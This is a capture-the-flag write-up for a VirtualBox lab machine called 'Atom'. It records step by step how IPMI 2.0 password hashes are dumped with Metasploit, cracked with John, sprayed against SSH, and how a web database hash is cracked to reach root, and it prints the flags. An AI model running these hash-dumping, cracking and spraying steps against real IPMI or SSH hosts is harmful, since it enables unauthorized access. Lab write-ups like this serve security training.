# Atom

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.88:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.88
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLuHH80SwA8Qff3pGOY4aBesL0Aeesw6jqX+pbtR9O7w8jlbyNhuHmjjABb/34BxFp2oBx8o5xuZVXS1cE9nAlE=
|   256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICKFE9s2IvPGAJ7Pt0kSC8t9OXYUrueJQQplSC2wbYtY
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

└─$ sudo nmap -sU 10.0.2.88 -vvvv
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-29 12:45 EDT
Initiating ARP Ping Scan at 12:45
Scanning 10.0.2.88 [1 port]
Completed ARP Ping Scan at 12:45, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:45
Completed Parallel DNS resolution of 1 host. at 12:45, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating UDP Scan at 12:45
Scanning 10.0.2.88 [1000 ports]
Increasing send delay for 10.0.2.88 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.0.2.88 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.0.2.88 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.0.2.88 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.0.2.88 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
UDP Scan Timing: About 4.58% done; ETC: 12:56 (0:10:47 remaining)
UDP Scan Timing: About 66.77% done; ETC: 13:02 (0:05:48 remaining)
Discovered open port 623/udp on 10.0.2.88
UDP Scan Timing: About 71.92% done; ETC: 13:02 (0:04:54 remaining)
UDP Scan Timing: About 92.95% done; ETC: 13:03 (0:01:14 remaining)
Completed UDP Scan at 13:03, 1098.66s elapsed (1000 total ports)
Nmap scan report for 10.0.2.88
Host is up, received arp-response (0.00043s latency).
Scanned at 2025-10-29 12:45:29 EDT for 1098s
Not shown: 999 closed udp ports (port-unreach)
PORT    STATE SERVICE  REASON
623/udp open  asf-rmcp udp-response ttl 63
MAC Address: 08:00:27:CE:DB:C2 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1099.10 seconds
           Raw packets sent: 1503 (72.298KB) | Rcvd: 1107 (83.900KB)
```
```
:::

## IPMI

- [623/UDP/TCP - IPMI](https://book.hacktricks.wiki/en/network-services-pentesting/623-udp-ipmi.html#623udptcp---ipmi)
- [Port 623 – ASF-RMCP (ASF Remote Management)](https://www.pentestpad.com/port-exploit/port-623-asf-rmcp-asf-remote-management)

```bash
└─$ sudo nmap -sU 10.0.2.88 -p 623 --script ipmi-version
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null_user
|_  Level: 1.5, 2.0
MAC Address: 08:00:27:CE:DB:C2 (Oracle VirtualBox virtual NIC)

└─$ sudo nmap -sU 10.0.2.88 -p 623 --script ipmi-brute
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-brute:
|   Accounts: No valid accounts found
|   Statistics: Performed 1319 guesses in 34 seconds, average tps: 38.8
|_  ERROR: The service seems to have failed or is heavily firewalled...
```

- [**CVE-2013-4786**](https://nvd.nist.gov/vuln/detail/CVE-2013-4786) – IPMI 2.0 authentication bypass vulnerability

```bash
└─$ msfconsole -q
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.0.2.88
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 10.0.2.88:623 - IPMI - Hash found: admin:c5802617029402003df7d9e7737a5a80f3f14c72ca41bc1da3693f43d1836c0e5c165230680b72a0a123456789abcdefa123456789abcdef140561646d696e:17601cc144961d5f577efb6ccd267bb43bf31187
[+] 10.0.2.88:623 - IPMI - Hash for user 'admin' matches password 'cukorborso'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
└─$ ipmitool -I lanplus -C 0 -H 10.0.2.88 -U admin -P cukorborso user list | grep USER | awk '{print($2)}' | tee users.txt
analiese
briella
richardson
carsten
sibylle
wai-ching
jerrilee
glynn
asia
zaylen
fabien
merola
jem
riyaz
laten
cati
rozalia
palmer
onida
terra
ranga
harrie
pauly
els
bqb
karlotte
zali
ende
stacey
shirin
kaki
saman
kalie
deshawn
mayeul
```

```bash
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > set USER_FILE users.txt
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_JOHN_FILE users_hashes.txt
```

```powershell
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
Warning: detected hash type "RAKP", but the string is also recognized as "RAKP-opencl"
Use the "--format=RAKP-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 35 password hashes with 35 different salts (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
me4life          (10.0.2.88 sibylle)
120691           (10.0.2.88 zaylen) 
batman!          (10.0.2.88 rozalia)
milo123          (10.0.2.88 deshawn)
chatroom         (10.0.2.88 fabien)
10101979         (10.0.2.88 wai-ching)
evan             (10.0.2.88 glynn)
290992           (10.0.2.88 bqb)
071590           (10.0.2.88 harrie)
emeralds         (10.0.2.88 karlotte)
jiggaman         (10.0.2.88 onida)
dezzy            (10.0.2.88 els)
kittyboo         (10.0.2.88 shirin)
mackenzie2       (10.0.2.88 merola)
jaffa1           (10.0.2.88 ranga)
tripod           (10.0.2.88 ende)
jesus06          (10.0.2.88 briella)
081704           (10.0.2.88 jem)
numberone        (10.0.2.88 kaki)
TWEETY1          (10.0.2.88 asia)
trick1           (10.0.2.88 laten)
515253           (10.0.2.88 pauly)
castillo1        (10.0.2.88 stacey)
billandben       (10.0.2.88 kalie)
241107           (10.0.2.88 mayeul)
number17         (10.0.2.88 jerrilee)
honda            (10.0.2.88 analiese)
sexymoma         (10.0.2.88 terra)
djones           (10.0.2.88 riyaz)
poynter          (10.0.2.88 zali)
2468             (10.0.2.88 carsten)
090506           (10.0.2.88 saman)
darell           (10.0.2.88 richardson)
122987           (10.0.2.88 cati)
phones           (10.0.2.88 palmer)
35g 0:00:00:00 DONE (2025-10-29 21:20) 63.06g/s 472331p/s 16531Kc/s 16531KC/s 123456..rebel91
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
└─$ netexec ssh 10.0.2.88 -u users2.txt -p pass2.txt --continue-on-success --no-bruteforce -t 4 --jitter 3
SSH         10.0.2.88       22     10.0.2.88        [+] onida:jiggaman  Linux - Shell access!
```

## SSH

```bash
└─$ sshpass -p 'jiggaman' ssh onida@10.0.2.88
onida@atom:~$ id
uid=1000(onida) gid=1000(onida) groups=1000(onida),100(users)
```

### User.txt

```bash
onida@atom:~$ cat user.txt
f75390001fa2fe806b4e3f1e5dadeb2b
```

## Privilege Escalation

SUID, not interesting so far
```bash
onida@atom:~$ find / -perm -4000 -ls 2>/dev/null
   523381     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
   523361     72 -rwsr-xr-x   1 root     root        72000 Mar 28  2024 /usr/bin/su
   523378     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
   523377     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
   523380     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
   525271     36 -rwsr-xr-x   1 root     root        35128 Mar 28  2024 /usr/bin/umount
   526642     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
   525267     60 -rwsr-xr-x   1 root     root        59704 Mar 28  2024 /usr/bin/mount
   561837    396 -rwsr-xr--   1 root     dip        403832 May 14  2022 /usr/sbin/pppd
   541049    640 -rwsr-xr-x   1 root     root       653888 Dec 19  2023 /usr/lib/openssh/ssh-keysign
   538834     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   654968     20 -rwsr-xr-x   1 root     root          18664 Jan 31  2023 /usr/lib/polkit-1/polkit-agent-helper-1
```

HTTP ports are open internally
```bash
onida@atom:~$ ss -tunlp4
Netid    State     Recv-Q     Send-Q         Local Address:Port          Peer Address:Port    Process
udp      UNCONN    0          0                    0.0.0.0:623                0.0.0.0:*
tcp      LISTEN    0          4096               127.0.0.1:45823              0.0.0.0:*
tcp      LISTEN    0          4096                 0.0.0.0:623                0.0.0.0:*
tcp      LISTEN    0          511                127.0.0.1:80                 0.0.0.0:*
tcp      LISTEN    0          128                  0.0.0.0:22                 0.0.0.0:*
```

```bash
onida@atom:/var/www/html$ sqlite3 atom-2400-database.db 'SELECT * FROM users' --box
┌────┬──────────┬──────────────────────────────────────────────────────────────┐
│ id │ username │                           password                           │
├────┼──────────┼──────────────────────────────────────────────────────────────┤
│ 1  │ atom     │ $2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm │
└────┴──────────┴──────────────────────────────────────────────────────────────┘

onida@atom:/var/www/html$ sqlite3 atom-2400-database.db 'SELECT username||":"||password FROM users'
atom:$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
```

```bash
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
madison          (atom)
```

```bash
onida@atom:/var/www/html$ su -
Password: madison
root@atom:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@atom:~# cat /root/root.txt
d3a4fd660f1af5a7e3c2f17314f4a962
```